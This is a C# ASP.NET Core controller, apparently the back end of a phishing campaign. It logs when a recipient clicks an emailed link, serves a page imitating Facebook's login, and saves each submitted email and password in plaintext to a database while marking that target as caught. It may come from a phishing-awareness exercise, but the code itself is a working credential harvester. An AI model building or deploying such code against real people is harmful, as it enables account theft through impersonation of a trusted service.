
 using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using WebApplicationProject.Models;


namespace WebApplicationProject.Controllers
 {
     public class FacebookLoginController : Controller
     {
         private readonly WebDatabaseContext _context;
         private readonly ILogger<FacebookLoginController> _logger;

         public FacebookLoginController(WebDatabaseContext context, ILogger<FacebookLoginController> logger)
         {
             _context = context;
             _logger = logger;
         }
         public IActionResult Index(int EmailId)
         {
             ViewBag.EmailId = EmailId;
         
         
             // Veritabanına ekleme işlemi
             var clicked = new ClickedMail
             {
                 EmailId = EmailId, 
                 Date = DateTime.Now,
                 Success = false
             };
         
             _context.Add(clicked);
             _context.SaveChanges();
             return View("~/Views/FacebookLogin/FacebookLogin.cshtml");
         }

         [HttpPost]
         [ValidateAntiForgeryToken]
         public async Task<IActionResult> PostLogin(string Email, string Password,int EmailId)
         {
             if (!string.IsNullOrEmpty(Email) && !string.IsNullOrEmpty(Password))
             {
                 // Veritabanına ekleme işlemi
                 var FacebookLogin = new FacebookLogin
                 {
                     Email = Email, 
                     Password = Password 
                 };
                 var clickedMail = _context.ClickedMails.FirstOrDefault(a => a.EmailId == EmailId);
                 clickedMail.Success = true;
                 _context.Add(FacebookLogin);
                 _context.Update(clickedMail);
                 await _context.SaveChangesAsync();
                 return View("Index");
             }

         return BadRequest(); // Hata durumunda bad request dönebilirsiniz
         }

     }
 }

